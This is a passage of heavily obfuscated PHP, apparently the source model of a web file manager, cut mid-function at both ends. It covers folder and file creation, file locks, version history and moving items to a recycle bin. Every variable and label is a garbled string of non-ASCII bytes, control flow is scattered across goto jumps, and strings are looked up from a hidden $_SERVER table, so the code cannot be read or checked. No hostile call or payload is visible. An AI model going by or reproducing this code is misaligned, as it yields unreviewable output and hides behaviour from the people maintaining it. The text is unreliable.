{ $f´Ñ‚¾´Â­[] = array($Cßç§÷ÚÓ[1926] => $bÃöäÁÏ•Œ, $Cßç§÷ÚÓ[939] => $Cßç§÷ÚÓ[1762], array($Cßç§÷ÚÓ[1927] => $bÃöäÁÏ•Œ, $Cßç§÷ÚÓ[1928] => array($Cßç§÷ÚÓ[7], array($Cßç§÷ÚÓ[438], $Cßç§÷ÚÓ[437])))); } $this->join($bê“’¦¿°¾); goto C“Ğ©Ã©†; A÷™£ÕÜ¿·: } private function _parseSearchWhere($e¸ñ¥ŞÅí) { goto BÈœ”êÅÛ; E„ÆÜé§Ç: if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[557]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[557]]) { $bå·á™Ñ†Ï[] = array($D«´§×Ä¨Ç[428] => $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[557]], $D«´§×Ä¨Ç[426] => $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[557]], $D«´§×Ä¨Ç[939] => $D«´§×Ä¨Ç[1762]); } if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[399]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[399]]) { $A•ÅÉÀÌİè = $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[399]]; if ($A•ÅÉÀÌİè == $D«´§×Ä¨Ç[76]) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[397]] = 1; } else { if ($A•ÅÉÀÌİè == $D«´§×Ä¨Ç[1932]) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[397]] = 0; } else { if ($A•ÅÉÀÌİè) { $A•ÅÉÀÌİè = is_array($A•ÅÉÀÌİè) ? $A•ÅÉÀÌİè : explode($D«´§×Ä¨Ç[47], $A•ÅÉÀÌİè); $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[399]] = array($D«´§×Ä¨Ç[405], $A•ÅÉÀÌİè); $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[397]] = 0; } } } } if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[472]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[472]]) { $aóÁİÕàŸØ = $this->sourceInfo($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[472]]); $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[548]] = array($D«´§×Ä¨Ç[507], $aóÁİÕàŸØ[$D«´§×Ä¨Ç[481]] . $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[472]] . $D«´§×Ä¨Ç[508]); } goto fïèèÚèº; fïèèÚèº: if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1758]]) && trim($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1758]])) { $bœÒ•»¯ª = trim($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1758]]); $aØôíòœáß = explode($D«´§×Ä¨Ç[50], $bœÒ•»¯ª); if (strlen($bœÒ•»¯ª) > 2 && (substr($bœÒ•»¯ª, 0, 1) == $D«´§×Ä¨Ç[115] && substr($bœÒ•»¯ª, -1) == $D«´§×Ä¨Ç[115]) || substr($bœÒ•»¯ª, 0, 1) == $D«´§×Ä¨Ç[55] && substr($bœÒ•»¯ª, -1) == $D«´§×Ä¨Ç[55]) { $bœÒ•»¯ª = substr($bœÒ•»¯ª, 1, -1); $aØôíòœáß = array($bœÒ•»¯ª); } $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[28]] = array(array($D«´§×Ä¨Ç[507], $D«´§×Ä¨Ç[1760] . $bœÒ•»¯ª . $D«´§×Ä¨Ç[1760])); if (count($aØôíòœáß) > 1) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[28]] = array(); foreach ($aØôíòœáß as $b¶„§‰‰´) { if (!trim($b¶„§‰‰´)) { continue; } $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[28]][] = array($D«´§×Ä¨Ç[507], $D«´§×Ä¨Ç[1760] . trim($b¶„§‰‰´) . $D«´§×Ä¨Ç[1760]); } } } return $bå·á™Ñ†Ï; goto b“ÅÚŞñ¡â; Eù‹Ã©Û”: if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[470]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[470]]) { $a£‚ÏÌ„ù = array($D«´§×Ä¨Ç[1930], $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[470]]); if ($bå·á™Ñ†Ï[$D«´§×Ä¨Ç[83]]) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[83]] = array($bå·á™Ñ†Ï[$D«´§×Ä¨Ç[83]], $a£‚ÏÌ„ù, $D«´§×Ä¨Ç[1931]); } else { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[83]] = $a£‚ÏÌ„ù; } } if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1920]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1920]] > 0) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[77]] = array($D«´§×Ä¨Ç[1929], $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1920]]); } if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1921]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1921]]) { $a£‚ÏÌ„ù = array($D«´§×Ä¨Ç[1930], $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[1921]]); if ($bå·á™Ñ†Ï[$D«´§×Ä¨Ç[77]]) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[77]] = array($bå·á™Ñ†Ï[$D«´§×Ä¨Ç[77]], $a£‚ÏÌ„ù, $D«´§×Ä¨Ç[1931]); } else { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[77]] = $a£‚ÏÌ„ù; } } goto E„ÆÜé§Ç; BÈœ”êÅÛ: $D«´§×Ä¨Ç =& $_SERVER[ÉóçÄÇ]; $bå·á™Ñ†Ï = array(); if (isset($e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[724]]) && $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[724]]) { $bå·á™Ñ†Ï[$D«´§×Ä¨Ç[83]] = array($D«´§×Ä¨Ç[1929], $e¸ñ¥ŞÅí[$D«´§×Ä¨Ç[724]]); } goto Eù‹Ã©Û”; b“ÅÚŞñ¡â: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($c¯à·ğ£Ğï) { $cÃõ‡Ë³× =& $_SERVER[ÉóçÄÇ]; $C±ÚÆ‘Šç = Model($cÃõ‡Ë³×[497])->where(array($cÃõ‡Ë³×[1503] => $c¯à·ğ£Ğï))->find(); $e‡ÎŒ‹Œ´ = $this->_mkdirRoot(SourceModel::TYPE_USER, $c¯à·ğ£Ğï, $C±ÚÆ‘Šç[$cÃõ‡Ë³×[28]]); $this->userDesktopAdd($e‡ÎŒ‹Œ´); return $e‡ÎŒ‹Œ´; } public function userDesktopAdd($AİÒÚ’£Å) { $CŸöíİ…Ş =& $_SERVER[ÉóçÄÇ]; $eã‡†¼Øê = LNG($CŸöíİ…Ş[1933]); $bõóö„“ó¡ = $this->mkdir($AİÒÚ’£Å, $eã‡†¼Øê); $this->metaSet($bõóö„“ó¡, $CŸöíİ…Ş[1934], $CŸöíİ…Ş[86]); $this->metaSet($AİÒÚ’£Å, $CŸöíİ…Ş[1935], $bõóö„“ó¡); } public function groupRootAdd($b…¢è¯É›’) { $D¿ğ½åëäİ =& $_SERVER[ÉóçÄÇ]; $D…‰•¦­‘ = Model($D¿ğ½åëäİ[480])->where(array($D¿ğ½åëäİ[1753] => $b…¢è¯É›’))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $b…¢è¯É›’, $D…‰•¦­‘[$D¿ğ½åëäİ[28]]); } public function systemRootPathAdd($cƒ…’ÉÜ†š) { if ($cƒ…’ÉÜ†š != $_SERVER[ÉóçÄÇ][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $cƒ…’ÉÜ†š); } public function userRootRemove($eá¨êÌª‹±) { $céèŸ´ìƒ« = $this->sourceRoot(SourceModel::TYPE_USER, $eá¨êÌª‹±); if (!$céèŸ´ìƒ«) { return; } $this->remove($céèŸ´ìƒ«, !1); } public function groupRootRemove($B˜ÚŠÕùøÉ) { $bÅ–»Ú³Ñ§ = $this->sourceRoot(SourceModel::TYPE_GROUP, $B˜ÚŠÕùøÉ); if (!$bÅ–»Ú³Ñ§) { return; } $this->remove($bÅ–»Ú³Ñ§, !1); } private function _mkdirRoot($bàÛ³»ÖÁ, $Fè×‚÷Î«¥, $c®äØãÄ…) { goto cŠ†°çÓæ”; f¬†Á¹Çê§: CacheLock::unlock($A¿à´Å·İ“); return $B£Ê±½İêé; goto c£İË“Æª­; c…›³ğ¨Òã: $A¿à´Å·İ“ = "\x4d\157\x64\x65\x6c\x53\x6f\165\x72\x63\145\56\155\153\x64\x69\x72\x52\157\157\x74\x2e{$bàÛ³»ÖÁ}\x2e{$Fè×‚÷Î«¥}\56" . $c®äØãÄ…; CacheLock::lock($A¿à´Å·İ“); $bÈÜ×æ”‰[$cÒĞ¼ÂËæ[28]] = $c®äØãÄ…; goto FŒë¹Â‹¤; cŠ†°çÓæ”: $cÒĞ¼ÂËæ =& $_SERVER[ÉóçÄÇ]; $bÈÜ×æ”‰ = array($cÒĞ¼ÂËæ[389] => 0, $cÒĞ¼ÂËæ[544] => $bàÛ³»ÖÁ, $cÒĞ¼ÂËæ[545] => $Fè×‚÷Î«¥, $cÒĞ¼ÂËæ[541] => 1, $cÒĞ¼ÂËæ[546] => USER_ID, $cÒĞ¼ÂËæ[547] => USER_ID, $cÒĞ¼ÂËæ[542] => $cÒĞ¼ÂËæ[33], $cÒĞ¼ÂËæ[548] => $cÒĞ¼ÂËæ[493], $cÒĞ¼ÂËæ[416] => 0, $cÒĞ¼ÂËæ[543] => 0, $cÒĞ¼ÂËæ[442] => 0, $cÒĞ¼ÂËæ[549] => $cÒĞ¼ÂËæ[33]); if ($E—Ö„ø¶ = $this->where($bÈÜ×æ”‰)->find()) { return $E—Ö„ø¶[$cÒĞ¼ÂËæ[390]]; } goto c…›³ğ¨Òã; FŒë¹Â‹¤: $B£Ê±½İêé = $this->add($bÈÜ×æ”‰); $e†‘äÈ¸¡ = array($cÒĞ¼ÂËæ[550] => short_id($B£Ê±½İêé)); $this->where(array($cÒĞ¼ÂËæ[404] => $B£Ê±½İêé))->save($e†‘äÈ¸¡); goto f¬†Á¹Çê§; c£İË“Æª­: } private function sourceRoot($d ºàªŒ¤¦, $a«îÀ³ÀÄ‚, $F‰ñ¤å¾ºÈ = false) { $fõ†¯¶óÏ =& $_SERVER[ÉóçÄÇ]; $eãÀÎÉ×†ˆ = array($fõ†¯¶óÏ[389] => 0, $fõ†¯¶óÏ[544] => $d ºàªŒ¤¦, $fõ†¯¶óÏ[545] => $a«îÀ³ÀÄ‚); if ($eİ¢ˆ‚²Ù = $this->where($eãÀÎÉ×†ˆ)->find()) { return $F‰ñ¤å¾ºÈ ? $eİ¢ˆ‚²Ù : $eİ¢ˆ‚²Ù[$fõ†¯¶óÏ[390]]; } return !1; } public function sourceRootGroup($E¹·¨Ø§É) { goto b÷÷¼”í˜Ë; b÷÷¼”í˜Ë: $dÌ‹š‰™Ö =& $_SERVER[ÉóçÄÇ]; if (is_string($E¹·¨Ø§É)) { $E¹·¨Ø§É = array($E¹·¨Ø§É); } $CçÍ£Å²Ó = array($dÌ‹š‰™Ö[389] => 0, $dÌ‹š‰™Ö[544] => SourceModel::TYPE_GROUP, $dÌ‹š‰™Ö[545] => array($dÌ‹š‰™Ö[7], $E¹·¨Ø§É)); goto D£ˆ¥‡Ó‚æ; D£ˆ¥‡Ó‚æ: $this->selectPageReset(); $cÜÊÕ­èò = $this->listSource($CçÍ£Å²Ó, 1000); $this->selectPageRestore(); goto cÒ£¾­Íì˜; cÒ£¾­Íì˜: return array_to_keyvalue($cÜÊÕ­èò[$dÌ‹š‰™Ö[74]], $dÌ‹š‰™Ö[478]); goto a—‘ÄÏ “Æ; a—‘ÄÏ “Æ: } public function mkfile($dË·ôç›, $a¾½ƒ±ğ¢Ñ, $FíÜ¯¯èù¬ = '', $EøÇêë…œÚ = REPEAT_RENAME) { $dÔ·¢ç©¢ö =& $_SERVER[ÉóçÄÇ]; $fÀ¯îŸ£¾ = Model($dÔ·¢ç©¢ö[566])->addFileByContent($FíÜ¯¯èù¬, $a¾½ƒ±ğ¢Ñ); return $this->_createFileCall($dË·ôç›, $a¾½ƒ±ğ¢Ñ, $fÀ¯îŸ£¾, $EøÇêë…œÚ, $dÔ·¢ç©¢ö[1196]); } public function addFile($d«Üæ†—˜, $bÏà‰¢ğ´†, $E÷ö‡ñ×æ, $F¦Ã×ø¹¸× = false, $C„ŒÇâéĞ = REPEAT_RENAME) { $fŒ––÷¹à¬ = Model($_SERVER[ÉóçÄÇ][566])->addFile($bÏà‰¢ğ´†, $E÷ö‡ñ×æ, $F¦Ã×ø¹¸×); return $this->_createFileCall($d«Üæ†—˜, $E÷ö‡ñ×æ, $fŒ––÷¹à¬, $C„ŒÇâéĞ); } public function addFileByFileID($F‹‰ó•ºç‰, $f›·¾¬ÀÙ‚, $eàø¥Ä·³Ñ, $B‹“‰œ£™Š = REPEAT_RENAME) { $d«¨Æ’¡¿ =& $_SERVER[ÉóçÄÇ]; $e•ôàÄÀŒ = Model($d«¨Æ’¡¿[566])->find($f›·¾¬ÀÙ‚); Model($d«¨Æ’¡¿[566])->linkAdd($f›·¾¬ÀÙ‚); return $this->_createFileCall($F‹‰ó•ºç‰, $eàø¥Ä·³Ñ, $e•ôàÄÀŒ, $B‹“‰œ£™Š); } public function addFileByRemote($E¼ßæˆ“×, $a‡ÈÍ–ˆÊ, $B§Ü¸¢ç”÷, $d‰—Ğ¼™õ¸ = array(), $c‹¯¬ìˆå = REPEAT_RENAME) { $Aô¼ã‡¶Í = Model($_SERVER[ÉóçÄÇ][566])->addFileByRemote($a‡ÈÍ–ˆÊ, $B§Ü¸¢ç”÷, $d‰—Ğ¼™õ¸); return $this->_createFileCall($E¼ßæˆ“×, $B§Ü¸¢ç”÷, $Aô¼ã‡¶Í, $c‹¯¬ìˆå); } private function _createFileCall($A¾õë“ö‚ñ, $c®¯Ğ˜•ğ, $FšÆˆ¸¿¸, $aáí¬Æ®ÒÒ, $b•ö««˜¨Ò = "\165\160\154\x6f\x61\144") { goto d‰®¶ñ¹¥; cÅ›¸ßÖ‚Ñ: $Eğ³·òèãß = $this->fileNameExist($A¾õë“ö‚ñ, $c®¯Ğ˜•ğ); $B ë†–î÷ = $this->_createFile($A¾õë“ö‚ñ, $c®¯Ğ˜•ğ, $FšÆˆ¸¿¸, $aáí¬Æ®ÒÒ, $dÛà¿®ùÒÍ); if (!$dÛà¿®ùÒÍ) { Model($aŸÃÄŸÁÜĞ[444])->remove($FšÆˆ¸¿¸[$aŸÃÄŸÁÜĞ[441]]); } goto C´êëæ¼; C´êëæ¼: if ($dÛà¿®ùÒÍ && $B ë†–î÷ && $B ë†–î÷ != $Eğ³·òèãß) { Model($aŸÃÄŸÁÜĞ[1905])->eventCreate($B ë†–î÷, $b•ö««˜¨Ò); } $this->lockWriteEnd($A¾õë“ö‚ñ, $c®¯Ğ˜•ğ); return $B ë†–î÷; goto FÎ¨²‹; d‰®¶ñ¹¥: $aŸÃÄŸÁÜĞ =& $_SERVER[ÉóçÄÇ]; $dÛà¿®ùÒÍ = !1; $this->lockWriteStart($A¾õë“ö‚ñ, $c®¯Ğ˜•ğ); goto cÅ›¸ßÖ‚Ñ; FÎ¨²‹: } public function mkdir($C™ì©‹ÑïÉ, $DÎ«ÂÇ©ß, $cÚÂˆ¹Ÿ‚Ü = REPEAT_SKIP) { goto EŠ½õ»´ƒ»; EŠ½õ»´ƒ»: $EÊçÓ¿Ù³‚ =& $_SERVER[ÉóçÄÇ]; $b›£‹˜ƒ‘ = $this->sourceInfo($C™ì©‹ÑïÉ); if (!$b›£‹˜ƒ‘) { return !1; } goto FïÀ˜Æç; eòÎ½Â–âÍ: $Eë‘Îöœ‹ = $this->_addSoure($aò‰ØÓÓ¨Ï, $b›£‹˜ƒ‘); Model($EÊçÓ¿Ù³‚[1905])->eventCreate($Eë‘Îöœ‹, $EÊçÓ¿Ù³‚[1197]); $this->lockWriteEnd($C™ì©‹ÑïÉ, $DÎ«ÂÇ©ß); goto d†ÈàÂîù»; d†ÈàÂîù»: return $Eë‘Îöœ‹; goto E§ŠÙÂÃ¦²; FïÀ˜Æç: $this->lockWriteStart($C™ì©‹ÑïÉ, $DÎ«ÂÇ©ß); if ($cÚÂˆ¹Ÿ‚Ü !== !1) { $FÆè˜Ú¡ğê = $this->fileNameExist($C™ì©‹ÑïÉ, $DÎ«ÂÇ©ß); if ($FÆè˜Ú¡ğê && $cÚÂˆ¹Ÿ‚Ü != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($C™ì©‹ÑïÉ, $DÎ«ÂÇ©ß); return $FÆè˜Ú¡ğê; } $DÎ«ÂÇ©ß = $this->fileNameAuto($C™ì©‹ÑïÉ, $DÎ«ÂÇ©ß, $cÚÂˆ¹Ÿ‚Ü); } $aò‰ØÓÓ¨Ï = array($EÊçÓ¿Ù³‚[541] => 1, $EÊçÓ¿Ù³‚[407] => $DÎ«ÂÇ©ß, $EÊçÓ¿Ù³‚[542] => $EÊçÓ¿Ù³‚[33], $EÊçÓ¿Ù³‚[442] => 0, $EÊçÓ¿Ù³‚[543] => 0); goto eòÎ½Â–âÍ; E§ŠÙÂÃ¦²: } private function _createFile($dò¿ĞÏ©İ¾, $fíŸ¿ŸÔï¶, $Cˆô«‹·ä, $f‹Öï„ìñ, &$e„™ÕÂ×Û¢) { goto a›‚°Ñ Ú; a›‚°Ñ Ú: $cÁ‹£‡èµ… =& $_SERVER[ÉóçÄÇ]; $E…ì‘Šï§ = $this->sourceInfo($dò¿ĞÏ©İ¾); if (!$Cˆô«‹·ä || !$E…ì‘Šï§) { return !1; } goto Bé‘Š°‡Åà; Bé‘Š°‡Åà: if ($f‹Öï„ìñ !== !1) { $f‡çò»„« = $this->fileNameExist($dò¿ĞÏ©İ¾, $fíŸ¿ŸÔï¶); } $e„™ÕÂ×Û¢ = !0; if ($f‹Öï„ìñ && $f‡çò»„«) { if ($f‹Öï„ìñ == REPEAT_SKIP) { $e„™ÕÂ×Û¢ = !1; return $f‡çò»„«; } else { if ($f‹Öï„ìñ == REPEAT_REPLACE) { $FßÚ™ñãİ° = $this->sourceInfo($f‡çò»„«); $eÖÎÜÂƒ•ß = $this->fileHistory($FßÚ™ñãİ°, $Cˆô«‹·ä[$cÁ‹£‡èµ…[441]], $Cˆô«‹·ä[$cÁ‹£‡èµ…[77]]); if (!$eÖÎÜÂƒ•ß) { $e„™ÕÂ×Û¢ = !1; } else { $this->folderSizeReset($dò¿ĞÏ©İ¾); } return $f‡çò»„«; } else { $fíŸ¿ŸÔï¶ = $this->fileNameAuto($dò¿ĞÏ©İ¾, $fíŸ¿ŸÔï¶, $f‹Öï„ìñ, !1); } } } goto F…Ù“ã‚ÇÓ; DÍâŞ°: return $cŒï‰½¾©; goto eï§àÙ‡¤¹; F…Ù“ã‚ÇÓ: $fçë»Õ†Œù = array($cÁ‹£‡èµ…[541] => 0, $cÁ‹£‡èµ…[407] => $fíŸ¿ŸÔï¶, $cÁ‹£‡èµ…[542] => get_path_ext($fíŸ¿ŸÔï¶), $cÁ‹£‡èµ…[442] => $Cˆô«‹·ä[$cÁ‹£‡èµ…[441]], $cÁ‹£‡èµ…[543] => $Cˆô«‹·ä[$cÁ‹£‡èµ…[77]]); $cŒï‰½¾© = $this->_addSoure($fçë»Õ†Œù, $E…ì‘Šï§); $this->folderSizeReset($dò¿ĞÏ©İ¾, intval($fçë»Õ†Œù[$cÁ‹£‡èµ…[77]])); goto DÍâŞ°; eï§àÙ‡¤¹: } protected function fileHistory($e±õï‡ĞÊ×, $e½ö¼±µŠ, $D¾ŸöìŠ«‹) { goto e´¦Ï•ŠÁ‰; fÌ®Ğº—Ô: Model($eÒæœºóÕ[1936])->addHistory($e±õï‡ĞÊ×); $D‚‹àİàìÛ = array($eÒæœºóÕ[547] => USER_ID, $eÒæœºóÕ[411] => time(), $eÒæœºóÕ[441] => $e½ö¼±µŠ, $eÒæœºóÕ[77] => $D¾ŸöìŠ«‹); $this->where(array($eÒæœºóÕ[404] => $e±õï‡ĞÊ×[$eÒæœºóÕ[390]]))->save($D‚‹àİàìÛ); goto eš†²ËïÅŠ; e´¦Ï•ŠÁ‰: $eÒæœºóÕ =& $_SERVER[ÉóçÄÇ]; if ($e±õï‡ĞÊ×[$eÒæœºóÕ[441]] == $e½ö¼±µŠ) { return !1; } $this->checkLock($e±õï‡ĞÊ×[$eÒæœºóÕ[390]], $e½ö¼±µŠ); goto fÌ®Ğº—Ô; eš†²ËïÅŠ: $this->sourceCacheClear($e±õï‡ĞÊ×[$eÒæœºóÕ[390]]); return !0; goto fÆœ¼Ú¤‘; fÆœ¼Ú¤‘: } public function checkLock($F¦™ßÄàğÆ, $D•¦é„ÅçÎ) { goto E¢äšÁÙŸĞ; c³ó•†©ªÈ: show_json(LNG($a¶…²Øé‘À[1939]) . $a¶…²Øé‘À[1940] . LNG($a¶…²Øé‘À[1941]) . $a¶…²Øé‘À[1942] . $D©ç©‡™Î£ . $a¶…²Øé‘À[1943], !1); goto CÖ‡°„ÃÅ; b¤Ÿ˜‚×¢ğ: $this->_createFileCall($d¶õœÒ‡“Ï[$a¶…²Øé‘À[472]], $EïŠŞÙ×¶à, $EŠÓô¸…Ò¼, REPEAT_REPLACE, $a¶…²Øé‘À[1196]); $då½¿‡ƒ„ = $d¶õœÒ‡“Ï[$a¶…²Øé‘À[439]][$a¶…²Øé‘À[505]]; $D©ç©‡™Î£ = $då½¿‡ƒ„[$a¶…²Øé‘À[1938]] ? $då½¿‡ƒ„[$a¶…²Øé‘À[1938]] : $då½¿‡ƒ„[$a¶…²Øé‘À[28]]; goto c³ó•†©ªÈ; f®¥†…¤: $FÚ­Ÿ„¿ª = Session::get($a¶…²Øé‘À[1937]); $EïŠŞÙ×¶à = substr($d¶õœÒ‡“Ï[$a¶…²Øé‘À[28]], 0, -1 - strlen($d¶õœÒ‡“Ï[$a¶…²Øé‘À[167]])) . $a¶…²Øé‘À[1463] . $FÚ­Ÿ„¿ª . $a¶…²Øé‘À[94] . $d¶õœÒ‡“Ï[$a¶…²Øé‘À[167]]; $EŠÓô¸…Ò¼ = Model($a¶…²Øé‘À[566])->find($D•¦é„ÅçÎ); goto b¤Ÿ˜‚×¢ğ; E¢äšÁÙŸĞ: $a¶…²Øé‘À =& $_SERVER[ÉóçÄÇ]; $d¶õœÒ‡“Ï = $this->pathInfo($F¦™ßÄàğÆ); if (!$this->fileIsLock($d¶õœÒ‡“Ï, !0)) { return; } goto f®¥†…¤; CÖ‡°„ÃÅ: } public function fileIsLock($a±’Ü³›Ş‡, $céâì´ÀÌš = false) { goto dÁñàêÌØó; dÁñàêÌØó: $E•Ô¦¿˜Œš =& $_SERVER[ÉóçÄÇ]; if (!isset($a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[439]]) || !$a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[439]][$E•Ô¦¿˜Œš[502]]) { return !1; } if ($a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[439]][$E•Ô¦¿˜Œš[502]] != USER_ID) { return !0; } goto bÕ°ÔÅ¼…‹; bÕ°ÔÅ¼…‹: $d¿ÀŸÉ‚¶ = $GLOBALS[$E•Ô¦¿˜Œš[6]][$E•Ô¦¿˜Œš[87]][$E•Ô¦¿˜Œš[503]]; if ($a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[439]][$E•Ô¦¿˜Œš[504]] <= time() - $d¿ÀŸÉ‚¶) { $this->metaSet($a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[390]], $E•Ô¦¿˜Œš[502], null); $this->metaSet($a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[390]], $E•Ô¦¿˜Œš[504], null); } if ($céâì´ÀÌš) { $this->metaSet($a±’Ü³›Ş‡[$E•Ô¦¿˜Œš[390]], $E•Ô¦¿˜Œš[504], time()); } goto d×ÙÌŞà¾²; d×ÙÌŞà¾²: return !1; goto D¹²ø—¸³Å; D¹²ø—¸³Å: } private function _addSoure($eŞÄÈæÃ­•, $aÁâÜ¦’Á˜) { goto FàÒÙ»š˜; EÏ¤ò³‡Õ: static $CêñŞÉÔÔÄ = false; if (!$CêñŞÉÔÔÄ) { Hook::trigger($E•””ë‡ƒˆ[531], $eŞÄÈæÃ­•); $CêñŞÉÔÔÄ = !0; } $AÆÛ¦Õ®ÄÏ = $this->add($eŞÄÈæÃ­•); goto dŒóÙ“ÔÌà; FàÒÙ»š˜: $E•””ë‡ƒˆ =& $_SERVER[ÉóçÄÇ]; $fÕï‚ˆ‹« = array($E•””ë‡ƒˆ[544] => $aÁâÜ¦’Á˜[$E•””ë‡ƒˆ[398]], $E•””ë‡ƒˆ[545] => $aÁâÜ¦’Á˜[$E•””ë‡ƒˆ[478]], $E•””ë‡ƒˆ[546] => USER_ID, $E•””ë‡ƒˆ[547] => USER_ID, $E•””ë‡ƒˆ[389] => $aÁâÜ¦’Á˜[$E•””ë‡ƒˆ[390]], $E•””ë‡ƒˆ[548] => $aÁâÜ¦’Á˜[$E•””ë‡ƒˆ[481]] . $aÁâÜ¦’Á˜[$E•””ë‡ƒˆ[390]] . $E•””ë‡ƒˆ[47], $E•””ë‡ƒˆ[416] => 0, $E•””ë‡ƒˆ[549] => $E•””ë‡ƒˆ[33]); $eŞÄÈæÃ­• = array_merge($fÕï‚ˆ‹«, $eŞÄÈæÃ­•); goto bÅøç¡‚†©; dŒóÙ“ÔÌà: $bÁİÕÆ¥È = array($E•””ë‡ƒˆ[550] => short_id($AÆÛ¦Õ®ÄÏ)); $this->where(array($E•””ë‡ƒˆ[404] => $AÆÛ¦Õ®ÄÏ))->save($bÁİÕÆ¥È); $this->setNamePinyin($AÆÛ¦Õ®ÄÏ, $eŞÄÈæÃ­•[$E•””ë‡ƒˆ[28]]); goto Aß÷…Ù£¬; bÅøç¡‚†©: $this->updateModifyTime($eŞÄÈæÃ­•[$E•””ë‡ƒˆ[472]]); $dŒ»ïÙ½öÒ = $E•””ë‡ƒˆ[1944] . $aÁâÜ¦’Á˜[$E•””ë‡ƒˆ[390]]; if (isset(self::$cacheChildList[$dŒ»ïÙ½öÒ])) { unset(self::$cacheChildList[$dŒ»ïÙ½öÒ]); } goto EÏ¤ò³‡Õ; Aß÷…Ù£¬: return $AÆÛ¦Õ®ÄÏ; goto Ešì¬‰¥ÆÁ; Ešì¬‰¥ÆÁ: } public function remove($aùØ¨‚¡àÚ, $dÛ¶ğ°ª© = true) { goto fÖÔÅÍÑŸµ; b¾ˆÂñßï‡: return $bÙÆ¼åù¸Î; goto E¶¨†øó†ï; D½õ‹¨ğš: $A®½Ó¨Ïšó = Model($AÒñÀšŒ‰»[1510])->get($AÒñÀšŒ‰»[1945]) == $AÒñÀšŒ‰»[86]; if ($B›îàô¨¤“ || $dÛ¶ğ°ª© || !$A®½Ó¨Ïšó) { return $this->removeNow($aùØ¨‚¡àÚ, $dÛ¶ğ°ª©); } $c‰ÄÏ‘Ÿ›ƒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto d³„éƒ‚ºä; a¼Áò¦³ğ: CacheLock::lock($A»¶ùÓÏ); $d°øŒ—‡âç = $this->fileNameExist($c‰ÄÏ‘Ÿ›ƒ, $f÷ğ³íô²‡); if (!$d°øŒ—‡âç) { $d°øŒ—‡âç = $this->mkdir($c‰ÄÏ‘Ÿ›ƒ, $f÷ğ³íô²‡, REPEAT_SKIP); $this->metaSet($d°øŒ—‡âç, $AÒñÀšŒ‰»[1949], $EášÖùîšÄ); $this->metaSet($d°øŒ—‡âç, $AÒñÀšŒ‰»[1950], $AØ­Êù„÷‰[$AÒñÀšŒ‰»[478]]); if ($AØ­Êù„÷‰[$AÒñÀšŒ‰»[472]] != 0) { $this->metaSet($d°øŒ—‡âç, $AÒñÀšŒ‰»[1951], _get($dÜƒÛ‹¦´ƒ, $AÒñÀšŒ‰»[1952])); } } goto e‹Îº©²ã; e‹Îº©²ã: CacheLock::unlock($A»¶ùÓÏ); $this->metaSet($aùØ¨‚¡àÚ, $AÒñÀšŒ‰»[1953], $AØ­Êù„÷‰[$AÒñÀšŒ‰»[472]]); $this->where(array($AÒñÀšŒ‰»[390] => $aùØ¨‚¡àÚ))->save(array($AÒñÀšŒ‰»[411] => time())); goto c°ÙÄËíÎ; fÖÔÅÍÑŸµ: $AÒñÀšŒ‰» =& $_SERVER[ÉóçÄÇ]; $AØ­Êù„÷‰ = $this->sourceInfo($aùØ¨‚¡àÚ); $B›îàô¨¤“ = intval($AØ­Êù„÷‰[$AÒñÀšŒ‰»[398]]) === self::TYPE_SYSTEM; goto D½õ‹¨ğš; c°ÙÄËíÎ: $this->recycleClear($AØ­Êù„÷‰); $bÙÆ¼åù¸Î = $this->move($aùØ¨‚¡àÚ, $d°øŒ—‡âç, REPEAT_RENAME_FOLDER); $this->folderSizeReset($AØ­Êù„÷‰[$AÒñÀšŒ‰»[472]]); goto b¾ˆÂñßï‡; d³„éƒ‚ºä: $EášÖùîšÄ = $AØ­Êù„÷‰[$AÒñÀšŒ‰»[398]] == self::TYPE_USER ? $AÒñÀšŒ‰»[557] : $AÒñÀšŒ‰»[997]; if ($EášÖùîšÄ == $AÒñÀšŒ‰»[557]) { 